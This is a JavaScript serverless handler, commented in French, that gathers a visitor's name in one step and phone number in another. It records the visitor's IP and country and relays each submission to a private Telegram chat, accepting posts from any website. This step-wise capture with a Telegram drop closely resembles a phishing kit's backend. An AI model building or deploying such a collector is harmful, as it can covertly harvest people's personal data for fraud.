export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST")
    return res.status(405).json({ error: "Méthode non autorisée" });

  try {
    const { step, nom, prenom, phone } = req.body || {};

    // 🔹 Récupération IP
    const ip =
      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
      req.headers["client-ip"] ||
      req.socket?.remoteAddress ||
      "IP inconnue";

    // 🔹 Récupération du pays via API publique
    let country = "Pays inconnu";
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      if (geoRes.ok) {
        const geoData = await geoRes.json();
        if (geoData && geoData.country_name) country = geoData.country_name;
      }
    } catch (err) {
      console.error("Erreur récupération géolocalisation:", err.message);
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Configuration Telegram manquante" });
    }

    // 🔹 Construction du message selon le step
    let text = "📩 Nouvelle soumission\n";
    text += `🌍 IP : ${ip} (${country})\n`;

    if (step === 1) {
      text += `👤 Nom : ${nom}\n👤 Prénom : ${prenom}`;
    } else if (step === 2) {
      text += `📱 Pho : ${phone}`;
    } else {
      return res.status(400).json({ error: "Step invalide" });
    }

    // 🔹 Envoi à Telegram
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      return res.status(500).json({ error: "Erreur Telegram", details: errorText });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: "Erreur serveur", details: err.message });
  }
}
